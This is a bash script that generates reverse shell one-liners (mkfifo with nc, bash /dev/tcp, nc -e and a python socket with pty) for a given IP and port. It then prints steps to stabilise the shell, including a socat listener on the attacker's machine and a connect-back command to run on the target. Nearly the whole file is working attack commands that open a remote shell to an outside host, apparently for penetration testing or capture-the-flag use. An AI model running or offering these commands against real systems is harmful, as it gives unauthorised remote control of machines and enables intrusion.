#!/bin/bash

RED='\033[0;31m'       # Red
GREEN='\033[0;32m'     # Green
YELLOW='\033[0;33m'    # Yellow
BLUE='\033[0;34m'      # Blue
MAGENTA='\033[0;35m'   # Magenta
CYAN='\033[0;36m'      # Cyan
WHITE='\033[0;37m'     # White

NC='\033[0m'

if [ "$#" -ne 3 ]; then
    echo -e "${GREEN}Usage:${NC} ${YELLOW}$0${NC} ${BLUE}<IP>${NC} ${RED}<PORT>${NC} ${MAGENTA}<TYPE: mkfifo, bash, nc, python>${NC}"
    exit 1
fi

IP="$1"
PORT="$2"
TYPE="$3"

echo ''

case "$TYPE" in
    "mkfifo")
        echo -e "${CYAN}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f${NC}"
        ;;
    "bash")
        echo -e "${CYAN}bash -c \"/bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1\"${NC}"
        ;;
    "nc")
        echo -e "${CYAN}nc $IP $PORT -e /bin/bash${NC}"
        ;;
    "python")
        echo -e "${CYAN}python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'${NC}"
        ;;
    *)
        echo -e "${RED}Invalid TYPE. Please choose one of: mkfifo, bash, nc, python${NC}"
        exit 1
        ;;
esac

echo -e "\n${GREEN}Stablize The Shell :${NC}"

echo -e "
${RED}With Python :${NC}

${YELLOW}python3 -c \"import pty; pty.spawn('/bin/bash')\"
Ctrl+Z ==> Enter
stty raw -echo;fg
export TERM=xterm
stty rows 200 columns 200${NC}"

echo -e "
${RED}With Socat :${NC}

${MAGENTA}on our local machine we run :${NC}
${YELLOW}socat file:`tty`,raw,echo=0 tcp-listen:5555${NC}

${MAGENTA}and we run on the target :${NC}
${YELLOW}./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:5555${NC}
"
